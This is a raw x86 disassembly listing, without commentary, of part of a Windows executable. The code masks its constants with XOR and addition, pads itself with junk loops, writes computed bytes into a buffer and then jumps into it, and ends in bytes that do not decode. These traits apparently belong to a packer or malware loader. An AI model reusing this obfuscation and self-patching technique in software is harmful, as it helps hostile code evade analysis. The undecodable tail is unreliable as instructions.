  40d8c2:	mov    ds:0x433647,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433653,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43375b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43375b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43375b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43375b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43375b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4336a7,0x43375f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433653
  40d93b:	and    edi,DWORD PTR ds:0x43372f
  40d941:	mov    DWORD PTR ds:0x433653,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4336a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4336a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4336a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4336a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4336a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4336a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4336a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4336a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43364f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4336db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4336f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43369f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43365f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433763,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4336eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43364f
  40da21:	sub    DWORD PTR ds:0x433667,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43365b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43372f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43372f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43372f,ecx
  40da55:	cmp    DWORD PTR ds:0x43372f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43372f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43372f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43372f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43372f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43375b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433697,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433697
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433697,ecx
  40dabd:	cmp    DWORD PTR ds:0x433697,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433697,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433974
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433663,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4336a7,0x43364f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433757,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433643,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433647,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4336cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433663,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43371f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43371f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43371f,ecx
  40db80:	cmp    DWORD PTR ds:0x43371f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43371f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43371f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43369f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433727,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433727,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433727,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433767
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433727,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433727
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433727,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433727
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433727,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433717,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433717
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433717,eax
  40dc3b:	cmp    DWORD PTR ds:0x433717,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433875
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433717,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433717
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433717,eax
  40dc72:	cmp    DWORD PTR ds:0x433717,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43364b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433647,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433773,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43369f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43369f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43369f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43369f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43369f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43369f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43369f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43369f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4336a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433767
  40dd13:	mov    DWORD PTR ds:0x4336a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43376b
  40dd26:	or     DWORD PTR ds:0x43371b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4336b3
  40dd3a:	and    DWORD PTR ds:0x43371f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433657,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43364f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43365b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43376b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43371b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43365b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4336a7,0x43372f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43375f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43369f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43365b,0x43372f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43364b
  40ddeb:	or     DWORD PTR ds:0x4336df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43375b,0x4336b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433763,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4336ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4336ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4336ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4336ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4336ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4336ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433767,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43371b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433757,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433763
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433697,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4336e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433657,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4336df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43372b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4336af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433717,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433727,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433727
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433727,ecx
  40e244:	cmp    DWORD PTR ds:0x433727,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433727,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433727
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433727,ecx
  40e279:	cmp    DWORD PTR ds:0x433727,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43375b,0x433647
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4336eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4336eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4336eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4336eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433974
  40e2d5:	push   0x433974
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4336eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	mov    DWORD PTR [edx+ebx*8+0x56],ecx
  40e324:	lds    esp,FWORD PTR [esp+edi*2+0x7c79a77c]
  40e32b:	jl     0x40e391
  40e32d:	pop    ss
  40e32e:	mov    ebp,0x3ef9c80f
  40e333:	lahf   
  40e334:	fild   DWORD PTR [ecx+0x37d434a1]
  40e33a:	or     dh,0x91
  40e33d:	mov    BYTE PTR [esi],0xcc
  40e340:	sahf   
  40e341:	(bad)  
  40e342:	pop    edx
  40e343:	inc    ebx
  40e344:	add    ebp,ebx
  40e346:	mov    eax,ds:0x89a3d4b1
  40e34b:	or     ebp,DWORD PTR [edi-0x18984155]
  40e351:	cli    
  40e352:	push   eax
  40e353:	lahf   
  40e354:	adc    BYTE PTR [ebx],0xa1
  40e357:	lods   eax,DWORD PTR ds:[esi]
  40e358:	int    0xb1
  40e35a:	and    DWORD PTR [esi+0x1b9fc457],eax
  40e360:	aas    
  40e361:	add    BYTE PTR [edx-0x5f],al
  40e364:	push   es
